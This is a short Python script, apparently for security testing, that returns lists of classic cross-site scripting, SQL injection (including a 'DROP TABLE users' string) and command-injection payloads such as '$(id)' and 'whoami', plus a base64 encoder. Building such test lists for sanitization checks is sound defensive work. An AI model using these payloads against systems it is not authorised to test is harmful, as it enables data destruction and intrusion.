#!/usr/bin/env python3
"""Test payload generator for security validation.

Used to test input sanitization. NOT for malicious purposes.
"""
import base64

def get_xss_payloads() -> list[str]:
    return [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(document.cookie)</script>',
        "javascript:alert(1)//",
    ]

def get_sqli_payloads() -> list[str]:
    return [
        "' OR 1=1 --",
        '" OR ""="',
        "'; DROP TABLE users; --",
        "1 UNION SELECT null,null,null--",
    ]

def get_command_injection_payloads() -> list[str]:
    """Non-destructive command injection test strings."""
    return [
        "; echo VULN",
        "| cat /etc/hostname",
        "`whoami`",
        "$(id)",
    ]

def encode_payload(payload: str) -> str:
    return base64.b64encode(payload.encode()).decode()

if __name__ == '__main__':
    for name, fn in [('XSS', get_xss_payloads), ('SQLi', get_sqli_payloads)]:
        print(f'--- {name} ---')
        for p in fn():
            print(f'  {p}')
